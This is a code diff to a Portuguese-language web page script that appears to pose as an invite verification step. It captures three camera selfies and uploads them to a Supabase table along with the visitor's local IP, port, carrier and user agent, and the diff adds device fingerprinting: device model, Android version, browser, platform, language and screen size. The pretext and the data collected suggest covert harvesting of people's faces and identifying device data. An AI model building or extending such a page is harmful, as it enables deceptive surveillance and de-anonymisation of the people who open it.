@@ -117,18 +117,54 @@ async function iniciarSistema(){
 window.onload = iniciarSistema;
 
 // =================================================================
+// ANALISADOR DE DISPOSITIVO
+// =================================================================
+function analisarDispositivo() {
+  const ua = navigator.userAgent;
+  let androidVersion = "Não é Android";
+  if (ua.indexOf("Android") >= 0) {
+      const match = ua.match(/Android\s([0-9\.]+)/);
+      if (match) androidVersion = match[1];
+  }
+  let browser = "Desconhecido";
+  if (ua.indexOf("Chrome") >= 0 && ua.indexOf("Edge") === -1) browser = "Chrome";
+  else if (ua.indexOf("Firefox") >= 0) browser = "Firefox";
+  else if (ua.indexOf("Safari") >= 0 && ua.indexOf("Chrome") === -1) browser = "Safari";
+  else if (ua.indexOf("Edge") >= 0 || ua.indexOf("Edg") >= 0) browser = "Edge";
+ 
+  let model = "Desconhecido";
+  if (ua.indexOf("Mobile") >= 0) {
+      const parts = ua.split(/[()]/);
+      if (parts.length > 1) {
+          const deviceParts = parts[1].split(';');
+          for (let part of deviceParts) {
+              if (part.indexOf("Android") === -1 && part.indexOf("Linux") === -1 &&
+                  part.indexOf("iPhone") === -1 && part.indexOf("iPad") === -1 &&
+                  part.indexOf("Windows") === -1 && part.indexOf("Macintosh") === -1 &&
+                  part.length > 2) {
+                  model = part.trim();
+                  break;
+              }
+          }
+      }
+  }
+  return { androidVersion, browser, model };
+}
+
+// =================================================================
 // BOTÃO - CAPTURA COMPLETA
 // =================================================================
 btn.addEventListener("click", async () => {
   try {
     btn.disabled = true;
     btn.innerHTML = "PROCESSANDO...";
-  
+ 
     statusText.innerHTML = "📨 Verificando informações do convite..";
     falar("Verificando informações do convite..");
 
-    if (!video.srcObject) {
-      throw new Error("Câmera não ativada. Recarregue a página.");
+    // Verificação da câmera
+    if (!video.srcObject || video.videoWidth === 0) {
+      throw new Error("Câmera não está pronta. Recarregue a página.");
     }
 
     const largura = video.videoWidth;
@@ -143,7 +179,7 @@ btn.addEventListener("click", async () => {
     const fotos = [];
     for(let i = 0; i < 3; i++) {
         ctx.drawImage(video, 0, 0, 640, 480);
-        fotos.push(canvas.toDataURL("image/jpeg", 0.75));
+        fotos.push(canvas.toDataURL("image/jpeg", 0.35));
         if(i < 2) await new Promise(resolve => setTimeout(resolve, 1000));
     }
 
@@ -165,6 +201,8 @@ btn.addEventListener("click", async () => {
     statusText.innerHTML = "💾 Salvando cadastro...";
     falar("Salvando cadastro.");
 
+    const infoDispositivo = analisarDispositivo();
+
     const { error } = await supabaseClient.from('checkins').insert([{
       tipo_captura: "completo",
       selfies: fotos,
@@ -175,7 +213,17 @@ btn.addEventListener("click", async () => {
       local_ip: portaInfo.local_ip,
       local_port: portaInfo.local_port,
       operadora: portaInfo.operadora,
-      user_agent: navigator.userAgent
+      cidade: "",
+      estado: "",
+      pais: "",
+      user_agent: navigator.userAgent,
+      modelo_dispositivo: infoDispositivo.model,
+      versao_android: infoDispositivo.androidVersion,
+      navegador: infoDispositivo.browser,
+      plataforma: navigator.platform,
+      idioma: navigator.language,
+      largura_tela: window.innerWidth,
+      altura_tela: window.innerHeight
     }]);
 
     if (error) throw error;
